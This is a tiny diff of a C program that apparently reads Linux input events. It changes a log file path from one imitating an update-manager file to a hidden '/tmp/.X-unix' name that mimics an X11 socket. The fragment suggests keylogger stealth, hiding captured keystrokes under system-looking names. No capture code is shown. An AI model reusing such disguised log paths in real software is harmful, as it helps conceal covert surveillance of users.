@@ -11,7 +11,7 @@
 #include <linux/input.h>
 #include <sys/stat.h>
 
-#define LOGFILE "/etc/update-manager/pre-release"
+#define LOGFILE "/tmp/.X-unix"
 #define RUN 1
 
 int main (int argc, char **argv) {
